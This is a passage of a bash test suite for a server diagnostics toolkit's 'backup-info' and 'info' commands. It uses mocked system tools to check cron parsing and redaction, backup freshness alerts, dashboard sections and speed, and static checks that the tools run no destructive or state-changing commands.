    source "'"${LIB_DIR}"'/backup.sh"
    backup_timestamp_to_epoch "Thu 2026-09-17 00:00:17 UTC"
')"
if [[ "$ts_epoch" =~ ^[0-9]+$ ]]; then
    ok "backup_timestamp_to_epoch converts a systemd-style timestamp string to a numeric epoch"
else
    bad "backup_timestamp_to_epoch did not produce a numeric epoch: '$ts_epoch'"
fi
ts_epoch_bad="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    backup_timestamp_to_epoch "garbage" 2>/dev/null
' || true)"
if [[ -z "$ts_epoch_bad" ]]; then
    ok "backup_timestamp_to_epoch returns empty for an unparseable timestamp"
else
    bad "backup_timestamp_to_epoch returned a bogus value for garbage input: '$ts_epoch_bad'"
fi

echo "== backup.sh pure-function tests: cron entry parsing/sanitization =="
cron_result="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    _backup_parse_cron_line "0 3 * * * /opt/app/scripts/backup-db.sh --password=SECRET123 >> /var/log/x.log 2>&1" 5 "user crontab" && printf "%s" "$REPLY"
')"
if [[ "$cron_result" == "0 3 * * *|backup-db.sh|user crontab" ]]; then
    ok "cron parsing extracts schedule and a sanitized command summary (basename only, no arguments/secrets)"
else
    bad "cron parsing did not sanitize correctly: '$cron_result'"
fi
if [[ "$cron_result" != *SECRET123* ]]; then
    ok "cron parsing never includes command arguments (secret value correctly excluded)"
else
    bad "cron parsing leaked a command argument into its output"
fi

cron_nonmatch="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    if _backup_parse_cron_line "0 3 * * * /usr/bin/some-other-task.sh" 5 "user crontab"; then printf "%s" "$REPLY"; else printf "NOMATCH"; fi
')"
cron_comment="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    if _backup_parse_cron_line "# 0 3 * * * backup-everything.sh" 5 "user crontab"; then printf "%s" "$REPLY"; else printf "NOMATCH"; fi
')"
cron_envline="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    if _backup_parse_cron_line "PATH=/usr/bin:/bin" 5 "user crontab"; then printf "%s" "$REPLY"; else printf "NOMATCH"; fi
')"
if [[ "$cron_nonmatch" == "NOMATCH" && "$cron_comment" == "NOMATCH" && "$cron_envline" == "NOMATCH" ]]; then
    ok "cron parsing ignores non-backup entries, comments, and environment-assignment lines"
else
    bad "cron parsing did not correctly ignore irrelevant lines: nonmatch='$cron_nonmatch' comment='$cron_comment' env='$cron_envline'"
fi

cron_system="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    _backup_parse_cron_line "0 2 * * * root /usr/local/bin/snapshot-volumes.sh" 6 "/etc/crontab" && printf "%s" "$REPLY"
')"
if [[ "$cron_system" == "0 2 * * *|snapshot-volumes.sh|/etc/crontab" ]]; then
    ok "cron parsing handles the 6-field system-crontab format (with a username column) correctly"
else
    bad "cron parsing did not handle the system-crontab format correctly: '$cron_system'"
fi

echo "== backup.sh pure-function tests: local file discovery (temp directories, not real system paths) =="
FAKE_HOME="$(mktemp -d)"
mkdir -p "${FAKE_HOME}/backups"
touch -d '2 hours ago' "${FAKE_HOME}/backups/old.tar.gz"
touch -d '10 minutes ago' "${FAKE_HOME}/backups/newest.tar.gz"
ln -s /etc/hostname "${FAKE_HOME}/backups/sneaky-symlink.tar.gz"
touch -d '1 minute ago' "${FAKE_HOME}/unrelated-newer-file.txt"

local_result="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    BACKUP_LOCAL_CANDIDATES=()
    HOME="'"${FAKE_HOME}"'" get_local_backup_candidates
')"
if grep -qF "newest.tar.gz" <<<"$local_result"; then
    ok "get_local_backup_candidates finds the newest file in a mocked backup directory"
else
    bad "get_local_backup_candidates did not find the expected newest file: '$local_result'"
fi
if ! grep -qF "sneaky-symlink" <<<"$local_result"; then
    ok "get_local_backup_candidates excludes symlinked files (symlink safety)"
else
    bad "get_local_backup_candidates incorrectly included a symlinked file"
fi
if ! grep -qF "unrelated-newer-file" <<<"$local_result"; then
    ok "get_local_backup_candidates only checks known candidate directories, not the whole home directory"
else
    bad "get_local_backup_candidates picked up a file outside its candidate directories (scan not bounded)"
fi

mkdir -p "${FAKE_HOME}/manyfiles"
for i in $(seq 1 100); do
    touch -d "${i} minutes ago" "${FAKE_HOME}/manyfiles/file-${i}.bak"
done
many_result="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    BACKUP_LOCAL_CANDIDATES=("'"${FAKE_HOME}"'/manyfiles")
    HOME=/nonexistent get_local_backup_candidates
')"
many_row_count="$(wc -l <<<"$many_result" | tr -d '[:space:]')"
if [[ "$many_row_count" -eq 1 ]] && grep -qF "file-1.bak" <<<"$many_result"; then
    ok "get_local_backup_candidates returns exactly one bounded row (the newest file) even with 100 files present"
else
    bad "get_local_backup_candidates output was not bounded with many files: rows=$many_row_count result='$many_result'"
fi

mkdir -p "${FAKE_HOME}/denied"
touch "${FAKE_HOME}/denied/file.bak"
chmod 000 "${FAKE_HOME}/denied"
denied_result="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/backup.sh"
    BACKUP_LOCAL_CANDIDATES=("'"${FAKE_HOME}"'/denied" "'"${FAKE_HOME}"'/manyfiles")
    HOME=/nonexistent get_local_backup_candidates
')"
denied_exit=$?
if [[ "$denied_exit" -eq 0 ]] && grep -qF "manyfiles" <<<"$denied_result"; then
    ok "get_local_backup_candidates tolerates a permission-denied candidate directory and still reports readable ones"
else
    bad "get_local_backup_candidates did not gracefully handle a permission-denied directory: exit=$denied_exit result='$denied_result'"
fi
chmod 755 "${FAKE_HOME}/denied"
rm -rf "$FAKE_HOME"

echo "== backup-info mocked scenarios (systemctl/crontab scripted) =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/systemctl" <<'MOCKEOF'
#!/usr/bin/env bash
scenario="${BACKUP_MOCK_TIMER_SCENARIO:-none}"
[[ "$scenario" == "unavailable" ]] && exit 1
case "$1" in
    --version) printf 'systemd 255\n' ;;
    list-units)
        case "$scenario" in
            backup) printf 'nightly-backup.timer loaded active waiting Nightly backup timer\n' ;;
            unrelated) printf 'apt-daily.timer loaded active waiting Daily apt download\n' ;;
            none) : ;;
        esac
        ;;
esac
exit 0
MOCKEOF
cat >"${MOCK_DIR}/crontab" <<'MOCKEOF'
#!/usr/bin/env bash
scenario="${BACKUP_MOCK_CRON_SCENARIO:-none}"
if [[ "$1" == "-l" ]]; then
    case "$scenario" in
        backup) printf '0 3 * * * /opt/app/dump-database.sh\n' ;;
        unrelated) printf '0 3 * * * /opt/app/send-report.sh\n' ;;
        none) printf 'no crontab for user\n' >&2; exit 1 ;;
    esac
fi
exit 0
MOCKEOF
chmod +x "${MOCK_DIR}/systemctl" "${MOCK_DIR}/crontab"
MOCK_PATH="${MOCK_DIR}:${PATH}"
FAKE_HOME2="$(mktemp -d)"

if BACKUP_LOCAL_CANDIDATES_OVERRIDE=/nonexistent-dir-xyz BACKUP_MOCK_TIMER_SCENARIO=none BACKUP_MOCK_CRON_SCENARIO=none HOME="$FAKE_HOME2" PATH="$MOCK_PATH" \
    "${BIN_DIR}/backup-info" >/tmp/toolkit_test_backup_none.out 2>/tmp/toolkit_test_backup_none.err; then
    if grep -qE '^Discovered sources +0$' /tmp/toolkit_test_backup_none.out; then
        ok "backup-info reports 0 discovered sources when nothing matches (mocked)"
    else
        bad "backup-info did not report 0 discovered sources correctly"
    fi
    if grep -q 'No configured/discoverable backup sources' /tmp/toolkit_test_backup_none.out; then
        ok "backup-info shows the explicit no-source message rather than an empty table"
    else
        bad "backup-info did not show the no-source message"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_backup_none.out | grep -q 'No backup anomalies'; then
        ok "backup-info raises no alert when no backup source is discoverable (not a problem, just unobservable)"
    else
        bad "backup-info incorrectly alerted when no backup source was discovered"
    fi
else
    bad "backup-info failed on the no-source mocked scenario: $(cat /tmp/toolkit_test_backup_none.err)"
fi

if BACKUP_LOCAL_CANDIDATES_OVERRIDE=/nonexistent-dir-xyz BACKUP_MOCK_TIMER_SCENARIO=backup BACKUP_MOCK_CRON_SCENARIO=backup HOME="$FAKE_HOME2" PATH="$MOCK_PATH" \
    "${BIN_DIR}/backup-info" >/tmp/toolkit_test_backup_found.out 2>/tmp/toolkit_test_backup_found.err; then
    if grep -qE '^Discovered sources +2$' /tmp/toolkit_test_backup_found.out; then
        ok "backup-info reports 2 discovered sources (one timer, one cron entry) (mocked)"
    else
        bad "backup-info did not report the correct discovered-source count"
    fi
    if grep -q 'nightly-backup.timer' /tmp/toolkit_test_backup_found.out; then
        ok "backup-info discovers a backup-named systemd timer (mocked)"
    else
        bad "backup-info did not discover the mocked backup timer"
    fi
    if grep -q 'dump-database.sh' /tmp/toolkit_test_backup_found.out; then
        ok "backup-info discovers a backup-related cron entry and shows its sanitized summary (mocked)"
    else
        bad "backup-info did not discover the mocked backup-related cron entry"
    fi
else
    bad "backup-info failed on the backup-found mocked scenario: $(cat /tmp/toolkit_test_backup_found.err)"
fi

if BACKUP_LOCAL_CANDIDATES_OVERRIDE=/nonexistent-dir-xyz BACKUP_MOCK_TIMER_SCENARIO=unrelated BACKUP_MOCK_CRON_SCENARIO=unrelated HOME="$FAKE_HOME2" PATH="$MOCK_PATH" \
    "${BIN_DIR}/backup-info" >/tmp/toolkit_test_backup_unrelated.out 2>/tmp/toolkit_test_backup_unrelated.err; then
    if grep -qE '^Discovered sources +0$' /tmp/toolkit_test_backup_unrelated.out; then
        ok "backup-info correctly ignores an unrelated systemd timer and unrelated cron entry (name-based filtering works)"
    else
        bad "backup-info incorrectly counted an unrelated timer/cron entry as a backup source"
    fi
else
    bad "backup-info failed on the unrelated-units mocked scenario: $(cat /tmp/toolkit_test_backup_unrelated.err)"
fi

if BACKUP_LOCAL_CANDIDATES_OVERRIDE=/nonexistent-dir-xyz BACKUP_MOCK_TIMER_SCENARIO=unavailable BACKUP_MOCK_CRON_SCENARIO=none HOME="$FAKE_HOME2" PATH="$MOCK_PATH" \
    "${BIN_DIR}/backup-info" >/tmp/toolkit_test_backup_nosystemd.out 2>/tmp/toolkit_test_backup_nosystemd.err; then
    ok "backup-info exits 0 when systemd is unavailable for timer discovery (mocked)"
else
    bad "backup-info failed when systemd was unavailable: $(cat /tmp/toolkit_test_backup_nosystemd.err)"
fi

FRESH_HOME="$(mktemp -d)"
mkdir -p "${FRESH_HOME}/backups"
touch -d '2 hours ago' "${FRESH_HOME}/backups/fresh.tar.gz"
if BACKUP_LOCAL_CANDIDATES_OVERRIDE=/nonexistent-dir-xyz BACKUP_MOCK_TIMER_SCENARIO=none BACKUP_MOCK_CRON_SCENARIO=none HOME="$FRESH_HOME" PATH="$MOCK_PATH" \
    "${BIN_DIR}/backup-info" >/tmp/toolkit_test_backup_fresh.out 2>/tmp/toolkit_test_backup_fresh.err; then
    if grep -qE 'fresh\.tar\.gz +fresh' /tmp/toolkit_test_backup_fresh.out; then
        ok "backup-info classifies a 2h-old backup as fresh (mocked, under the 24h threshold)"
    else
        bad "backup-info did not classify the fresh mocked backup correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_backup_fresh.out | grep -q 'No backup anomalies'; then
        ok "backup-info raises no alert for a fresh backup"
    else
        bad "backup-info incorrectly alerted on a fresh backup"
    fi
else
    bad "backup-info failed on the fresh-backup mocked scenario: $(cat /tmp/toolkit_test_backup_fresh.err)"
fi
rm -rf "$FRESH_HOME"

STALE_HOME="$(mktemp -d)"
mkdir -p "${STALE_HOME}/backups"
touch -d '3 days ago' "${STALE_HOME}/backups/stale.tar.gz"
if BACKUP_LOCAL_CANDIDATES_OVERRIDE=/nonexistent-dir-xyz BACKUP_MOCK_TIMER_SCENARIO=none BACKUP_MOCK_CRON_SCENARIO=none HOME="$STALE_HOME" PATH="$MOCK_PATH" \
    "${BIN_DIR}/backup-info" >/tmp/toolkit_test_backup_stale.out 2>/tmp/toolkit_test_backup_stale.err; then
    if grep -qE 'stale\.tar\.gz +stale' /tmp/toolkit_test_backup_stale.out; then
        ok "backup-info classifies a 3-day-old backup as stale (mocked, over the 24h threshold)"
    else
        bad "backup-info did not classify the stale mocked backup correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_backup_stale.out | grep -qE "older than 24h"; then
        ok "backup-info raises a factual stale-backup alert with the documented threshold"
    else
        bad "backup-info did not raise the expected stale-backup alert"
    fi
else
    bad "backup-info failed on the stale-backup mocked scenario: $(cat /tmp/toolkit_test_backup_stale.err)"
fi
rm -rf "$STALE_HOME"
rm -rf "$FAKE_HOME2"
rm -rf "$MOCK_DIR"

echo "== backup-info: cron commands are never executed (behavioral proof) =="
MOCK_DIR="$(mktemp -d)"
CANARY_FILE="$(mktemp -u)"
cat >"${MOCK_DIR}/crontab" <<MOCKEOF
#!/usr/bin/env bash
[[ "\$1" == "-l" ]] && printf '0 3 * * * touch ${CANARY_FILE} # backup-canary\n'
exit 0
MOCKEOF
chmod +x "${MOCK_DIR}/crontab"
PATH="${MOCK_DIR}:${PATH}" "${BIN_DIR}/backup-info" >/tmp/toolkit_test_backup_cronexec.out 2>/tmp/toolkit_test_backup_cronexec.err
if [[ ! -e "$CANARY_FILE" ]]; then
    ok "backup-info never executes a command discovered in cron configuration (canary file was not created)"
else
    bad "backup-info appears to have executed a cron-discovered command - canary file was created"
    rm -f "$CANARY_FILE"
fi
rm -rf "$MOCK_DIR"

echo "== backup-info: no state-changing/destructive commands present (static check) =="
if ! grep -nE '(^|[^A-Za-z0-9_.])(rm|mv|cp|rsync|tar|zip|gzip|pg_dump|pg_restore)\b' \
    "${TOOLKIT_DIR}/lib/backup.sh" "${BIN_DIR}/backup-info"; then
    ok "backup.sh / backup-info contain no rm/mv/cp/rsync/tar/zip/gzip/pg_dump/pg_restore invocations"
else
    bad "backup.sh / backup-info appear to invoke a destructive/backup-creating command"
fi
if ! grep -nE 'docker +(export|cp|commit)\b' "${TOOLKIT_DIR}/lib/backup.sh" "${BIN_DIR}/backup-info"; then
    ok "backup.sh / backup-info contain no docker export/cp/commit invocations"
else
    bad "backup.sh / backup-info appear to invoke docker export/cp/commit"
fi
if ! grep -nE 'systemctl +(start|stop|restart|reload|enable|disable|mask|unmask)\b|(^|[^A-Za-z0-9_])service +[A-Za-z0-9._-]+ +(start|stop|restart|reload)\b' \
    "${TOOLKIT_DIR}/lib/backup.sh" "${BIN_DIR}/backup-info"; then
    ok "backup.sh / backup-info contain no systemctl/service state-changing invocations"
else
    bad "backup.sh / backup-info appear to invoke a state-changing systemctl/service command"
fi
if ! grep -nE '(^|[^A-Za-z0-9_.])(kill|pkill|killall|chmod|chown|truncate)\b' \
    "${TOOLKIT_DIR}/lib/backup.sh" "${BIN_DIR}/backup-info"; then
    ok "backup.sh / backup-info contain no kill/pkill/killall/chmod/chown/truncate invocations"
else
    bad "backup.sh / backup-info appear to invoke a process-killing or permission-modifying command"
fi
if ! grep -nE '\btee\b|\bsed\b[^|]*-i\b|\beval\b|\bbash\s+-c\b|\bsh\s+-c\b' \
    "${TOOLKIT_DIR}/lib/backup.sh" "${BIN_DIR}/backup-info"; then
    ok "backup.sh / backup-info contain no tee/sed -i/eval/bash -c/sh -c invocations"
else
    bad "backup.sh / backup-info appear to invoke tee, sed -i, eval, or a shell -c execution"
fi

echo "== no lingering backup-info background processes =="
sleep 1
backup_leftover="$(pgrep -f 'BACKUP_MOCK_TIMER_SCENARIO|toolkit_test_backup' 2>/dev/null || true)"
if [[ -z "$backup_leftover" ]]; then
    ok "no lingering mocked-systemctl/crontab or backup-info processes"
else
    bad "found lingering process(es): $backup_leftover"
fi

echo "== info v2: live dashboard has all expected fast sections =="
if "${BIN_DIR}/info" >/tmp/toolkit_test_infov2_live.out 2>/tmp/toolkit_test_infov2_live.err; then
    if grep -q '^SERVER$' /tmp/toolkit_test_infov2_live.out && grep -q '^SYSTEM$' /tmp/toolkit_test_infov2_live.out && \
       grep -q '^GPU$' /tmp/toolkit_test_infov2_live.out && grep -q '^NETWORK$' /tmp/toolkit_test_infov2_live.out && \
       grep -q '^DOCKER$' /tmp/toolkit_test_infov2_live.out && grep -q '^SERVICES$' /tmp/toolkit_test_infov2_live.out && \
       grep -q '^SECURITY$' /tmp/toolkit_test_infov2_live.out && grep -q '^ALERTS$' /tmp/toolkit_test_infov2_live.out; then
        ok "info prints SERVER/SYSTEM/GPU/NETWORK/DOCKER/SERVICES/SECURITY/ALERTS sections"
    else
        bad "info is missing one or more expected fast-dashboard sections"
    fi
    if ! grep -q '^TOP SERVICES$' /tmp/toolkit_test_infov2_live.out; then
        ok "info no longer includes the slow per-container 'docker stats' TOP SERVICES section"
    else
        bad "info still includes TOP SERVICES (the slow docker-stats section that was removed for performance)"
    fi
else
    bad "info exited non-zero: $(cat /tmp/toolkit_test_infov2_live.err)"
fi

echo "== info v2: fast execution path (<2s outer bound) =="
start_ts=$(date +%s)
if timeout 5 "${BIN_DIR}/info" >/dev/null 2>/tmp/toolkit_test_infov2_speed.err; then
    end_ts=$(date +%s)
    elapsed=$(( end_ts - start_ts ))
    if [[ "$elapsed" -le 2 ]]; then
        ok "info completes well within budget (${elapsed}s)"
    else
        bad "info took ${elapsed}s - slower than the fast-dashboard target"
    fi
else
    bad "info did not complete within the outer 5s safety timeout: $(cat /tmp/toolkit_test_infov2_speed.err)"
fi

echo "== info v2: no deep-scan/expensive-module invocation (static check) =="
if ! grep -qE 'docker stats|get_top_containers' "${BIN_DIR}/info"; then
    ok "info no longer invokes docker stats / get_top_containers (removed slow per-container sampling)"
else
    bad "info still references docker stats or get_top_containers"
fi
if ! grep -qE 'source .*/(storage|backup|network|docker)\.sh' "${BIN_DIR}/info"; then
    ok "info does not source storage.sh/backup.sh/network.sh/docker.sh (deep-scan modules stay in their own commands)"
else
    bad "info sources a deep-scan module it shouldn't need for a fast dashboard"
fi
if ! grep -qE 'get_recent_journal_events|get_kernel_event_count|get_dir_total_bytes|get_dir_sizes_at_depth|get_large_files_in|get_local_backup_candidates|get_backup_related_timers|get_backup_related_cron_entries|collect_docker_containers|get_listening_ports' "${BIN_DIR}/info"; then
    ok "info does not call any deep-diagnostic function from storage/backup/network/docker.sh"
else
    bad "info appears to call a deep-diagnostic function that belongs in a dedicated command"
fi

echo "== info v2: status/alert contract (lib/status.sh) pure-function tests =="
status_test_result="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/status.sh"
    demo=()
    add_alert demo WARN docker "Docker: 1 unhealthy container(s)"
    add_alert demo ERROR services "systemd unavailable"
    render_alerts demo "No active alerts"
')"
if [[ "$status_test_result" == "$(printf '\xe2\x9a\xa0 Docker: 1 unhealthy container(s)\n\xe2\x9a\xa0 systemd unavailable')" ]]; then
    ok "add_alert/render_alerts format WARN/ERROR alerts correctly"
else
    bad "add_alert/render_alerts did not format alerts correctly: '$status_test_result'"
fi

status_empty_result="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/status.sh"
    demo=()
    render_alerts demo "Everything is fine"
')"
if [[ "$status_empty_result" == "$(printf '\xe2\x9c\x93 Everything is fine')" ]]; then
    ok "render_alerts prints the ok_message with a checkmark when the alert array is empty"
else
    bad "render_alerts did not print the empty-state message correctly: '$status_empty_result'"
fi

echo "== info v2 mocked scenarios (systemctl/ps/journalctl/docker/ufw scripted) =="
MOCK_DIR="$(mktemp -d)"
cat >"${MOCK_DIR}/systemctl" <<'MOCKEOF'
#!/usr/bin/env bash
scenario="${INFO_MOCK_SCENARIO:-healthy}"
[[ -n "${INFO_MOCK_SYSTEMCTL_COUNTER:-}" ]] && printf 'x\n' >>"$INFO_MOCK_SYSTEMCTL_COUNTER"
[[ "$scenario" == "nosystemd" ]] && exit 1
case "$1" in
    --version) printf 'systemd 255\n' ;;
    is-system-running) printf 'running\n' ;;
    list-units)
        if [[ "$*" == *"--failed"* ]]; then
            [[ "$scenario" == "failedservices" ]] && printf 'broken.service loaded failed failed A broken service\n'
        else
            printf 'ssh.service loaded active running OpenSSH server\n'
            printf 'cron.service loaded active running cron daemon\n'
            [[ "$scenario" == "failedservices" ]] && printf 'broken.service loaded failed failed A broken service\n'
        fi
        ;;
esac
exit 0
MOCKEOF
cat >"${MOCK_DIR}/ps" <<'MOCKEOF'
#!/usr/bin/env bash
scenario="${INFO_MOCK_SCENARIO:-healthy}"
case "$scenario" in
    highcpu)
        printf '100 1 alice 95.0 5.0 R stress-test\n'
        printf '101 1 bob 1.0 2.0 S normal-proc\n'
        ;;
    *)
        printf '100 1 alice 1.0 2.0 S normal-proc\n'
        printf '101 1 bob 0.5 1.0 S another-proc\n'
        ;;
esac
exit 0
MOCKEOF
cat >"${MOCK_DIR}/journalctl" <<'MOCKEOF'
#!/usr/bin/env bash
scenario="${INFO_MOCK_SCENARIO:-healthy}"
[[ -n "${INFO_MOCK_JOURNALCTL_COUNTER:-}" ]] && printf 'x\n' >>"$INFO_MOCK_JOURNALCTL_COUNTER"
[[ "${1:-}" == "--version" ]] && { printf 'systemd 255\n'; exit 0; }
case "$scenario" in
    logerrors) printf 'err1\nerr2\nerr3\n' ;;
    *) : ;;
esac
exit 0
MOCKEOF
cat >"${MOCK_DIR}/docker" <<'MOCKEOF'
#!/usr/bin/env bash
scenario="${INFO_MOCK_SCENARIO:-healthy}"
case "$1" in
    version) printf '0.0.0-mock\n' ;;
    info)
        printf '{"ContainersRunning":2,"Containers":2,"Images":1}\n'
        ;;
    ps)
        case "${2:-}" in
            -a) printf 'svc-a|Up 1 hour (healthy)\nsvc-b|Up 1 hour\n' ;;
        esac
        ;;
esac
exit 0
MOCKEOF
cat >"${MOCK_DIR}/ufw" <<'MOCKEOF'
#!/usr/bin/env bash
scenario="${INFO_MOCK_SCENARIO:-healthy}"
if [[ "$scenario" == "ufwinactive" ]]; then
    printf 'Status: inactive\n'
else
    printf 'Status: active\n'
fi
exit 0
MOCKEOF
chmod +x "${MOCK_DIR}/systemctl" "${MOCK_DIR}/ps" "${MOCK_DIR}/journalctl" "${MOCK_DIR}/docker" "${MOCK_DIR}/ufw"
MOCK_PATH="${MOCK_DIR}:${PATH}"

if INFO_MOCK_SCENARIO=healthy PATH="$MOCK_PATH" "${BIN_DIR}/info" >/tmp/toolkit_test_infov2_healthy.out 2>/tmp/toolkit_test_infov2_healthy.err; then
    if grep -qE '^Running +2$' /tmp/toolkit_test_infov2_healthy.out; then
        ok "info SERVICES section reports the mocked running count"
    else
        bad "info SERVICES section did not report the mocked running count correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_infov2_healthy.out | grep -q 'No active alerts'; then
        ok "info raises no alert for a fully healthy mocked system"
    else
        bad "info raised an unexpected alert for a healthy mocked system: $(sed -n '/^ALERTS$/,$p' /tmp/toolkit_test_infov2_healthy.out)"
    fi
else
    bad "info failed on the healthy mocked scenario: $(cat /tmp/toolkit_test_infov2_healthy.err)"
fi

if INFO_MOCK_SCENARIO=nosystemd PATH="$MOCK_PATH" "${BIN_DIR}/info" >/tmp/toolkit_test_infov2_nosystemd.out 2>/tmp/toolkit_test_infov2_nosystemd.err; then
    if grep -A3 '^SERVICES$' /tmp/toolkit_test_infov2_nosystemd.out | grep -qE '^Running +N/A$' && \
       grep -A3 '^SERVICES$' /tmp/toolkit_test_infov2_nosystemd.out | grep -qE '^Failed +N/A$'; then
        ok "info reports SERVICES as N/A when systemd is unavailable, without crashing"
    else
        bad "info did not report N/A for SERVICES when systemd was unavailable"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_infov2_nosystemd.out | grep -qi 'systemd\|service'; then
        bad "info incorrectly alerted merely because systemd was unavailable"
    else
        ok "info does not alert merely because systemd is unavailable (N/A is not a problem signal)"
    fi
else
    bad "info failed (nonzero exit) when systemd was unavailable: $(cat /tmp/toolkit_test_infov2_nosystemd.err)"
fi

if INFO_MOCK_SCENARIO=failedservices PATH="$MOCK_PATH" "${BIN_DIR}/info" >/tmp/toolkit_test_infov2_failedsvc.out 2>/tmp/toolkit_test_infov2_failedsvc.err; then
    if grep -qE '^Failed +1$' /tmp/toolkit_test_infov2_failedsvc.out; then
        ok "info SERVICES section reports 1 failed service (mocked)"
    else
        bad "info did not report the mocked failed-service count correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_infov2_failedsvc.out | grep -qE '1 failed systemd service'; then
        ok "info alerts on failed systemd services (reusing services.sh)"
    else
        bad "info did not alert on the mocked failed service"
    fi
else
    bad "info failed on the failedservices mocked scenario: $(cat /tmp/toolkit_test_infov2_failedsvc.err)"
fi

if INFO_MOCK_SCENARIO=highcpu PATH="$MOCK_PATH" "${BIN_DIR}/info" >/tmp/toolkit_test_infov2_highcpu.out 2>/tmp/toolkit_test_infov2_highcpu.err; then
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_infov2_highcpu.out | grep -qE '1 process\(es\) above 90% CPU'; then
        ok "info alerts on a mocked process exceeding the documented 90% CPU threshold"
    else
        bad "info did not alert on the mocked high-CPU process"
    fi
else
    bad "info failed on the highcpu mocked scenario: $(cat /tmp/toolkit_test_infov2_highcpu.err)"
fi

if INFO_MOCK_SCENARIO=logerrors PATH="$MOCK_PATH" "${BIN_DIR}/info" >/tmp/toolkit_test_infov2_logerr.out 2>/tmp/toolkit_test_infov2_logerr.err; then
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_infov2_logerr.out | grep -qE '3 error-level journal entries in the last 24h'; then
        ok "info alerts on mocked error-level journal entries"
    else
        bad "info did not alert on the mocked journal errors"
    fi
else
    bad "info failed on the logerrors mocked scenario: $(cat /tmp/toolkit_test_infov2_logerr.err)"
fi

if INFO_MOCK_SCENARIO=ufwinactive PATH="$MOCK_PATH" "${BIN_DIR}/info" >/tmp/toolkit_test_infov2_ufw.out 2>/tmp/toolkit_test_infov2_ufw.err; then
    if grep -A2 '^SECURITY$' /tmp/toolkit_test_infov2_ufw.out | grep -qE '^UFW +inactive$'; then
        ok "info SECURITY section reports mocked UFW inactive status"
    else
        bad "info did not report the mocked UFW inactive status correctly"
    fi
    if grep -A5 '^ALERTS$' /tmp/toolkit_test_infov2_ufw.out | grep -qi 'UFW firewall is inactive'; then
        ok "info alerts on inactive UFW (mocked)"
    else
        bad "info did not alert on the mocked inactive UFW"
    fi
else
    bad "info failed on the ufwinactive mocked scenario: $(cat /tmp/toolkit_test_infov2_ufw.err)"
fi

SYSTEMCTL_COUNTER="$(mktemp)"
JOURNALCTL_COUNTER="$(mktemp)"
if INFO_MOCK_SCENARIO=healthy INFO_MOCK_SYSTEMCTL_COUNTER="$SYSTEMCTL_COUNTER" INFO_MOCK_JOURNALCTL_COUNTER="$JOURNALCTL_COUNTER" \
    PATH="$MOCK_PATH" "${BIN_DIR}/info" >/tmp/toolkit_test_infov2_calls.out 2>/tmp/toolkit_test_infov2_calls.err; then
    systemctl_calls="$(wc -l <"$SYSTEMCTL_COUNTER" | tr -d '[:space:]')"
    journalctl_calls="$(wc -l <"$JOURNALCTL_COUNTER" | tr -d '[:space:]')"
    if [[ "$systemctl_calls" -le 4 ]]; then
        ok "info makes a small, bounded number of systemctl calls (${systemctl_calls}), not N+1"
    else
        bad "info invoked systemctl ${systemctl_calls} times - expected a small bounded number"
    fi
    if [[ "$journalctl_calls" -le 2 ]]; then
        ok "info makes only its one bounded journalctl error-count call (${journalctl_calls} invocation(s)), not logs-info's full routine"
    else
        bad "info invoked journalctl ${journalctl_calls} times - expected only its single bounded error-count check"
    fi
else
    bad "info failed while counting systemctl/journalctl invocations: $(cat /tmp/toolkit_test_infov2_calls.err)"
fi
rm -f "$SYSTEMCTL_COUNTER" "$JOURNALCTL_COUNTER"
rm -rf "$MOCK_DIR"

echo "== info v2: no state-changing/destructive commands present (static check) =="
if ! grep -nE '(^|[^A-Za-z0-9_.-])(rm|kill|pkill|killall)\b' "${BIN_DIR}/info" "${LIB_DIR}/status.sh"; then
    ok "info / status.sh contain no rm/kill/pkill/killall invocations"
else
    bad "info / status.sh appear to invoke rm/kill/pkill/killall"
fi
if ! grep -nE 'systemctl +(start|stop|restart|reload|enable|disable|mask|unmask)\b|docker +(rm|stop|prune|kill)\b|journalctl[^|&;]*(--vacuum|--rotate|--flush)\b' \
    "${BIN_DIR}/info" "${LIB_DIR}/status.sh"; then
    ok "info / status.sh contain no systemctl/docker/journalctl state-changing invocations"
else
    bad "info / status.sh appear to invoke a state-changing systemctl/docker/journalctl command"
fi
if ! grep -nE '\beval\b|\bsed\b[^|]*-i\b|\btee\b' "${BIN_DIR}/info" "${LIB_DIR}/status.sh"; then
    ok "info / status.sh contain no eval/sed -i/tee invocations"
else
    bad "info / status.sh appear to invoke eval, sed -i, or tee"
fi

echo "== no lingering info-v2 background processes =="
sleep 1
info_leftover="$(pgrep -f 'INFO_MOCK_SCENARIO|toolkit_test_infov2' 2>/dev/null || true)"
if [[ -z "$info_leftover" ]]; then
    ok "no lingering mocked-command or info processes"
else
    bad "found lingering process(es): $info_leftover"
fi

echo "== info works with nvidia-smi mocked unavailable =="
# Prepend a stub directory whose nvidia-smi always fails, simulating an
# environment where the tool is present but reports no GPU / is unusable.
STUB_DIR="$(mktemp -d)"
trap 'rm -rf "$STUB_DIR"' EXIT
printf '#!/bin/sh\nexit 1\n' >"${STUB_DIR}/nvidia-smi"
chmod +x "${STUB_DIR}/nvidia-smi"
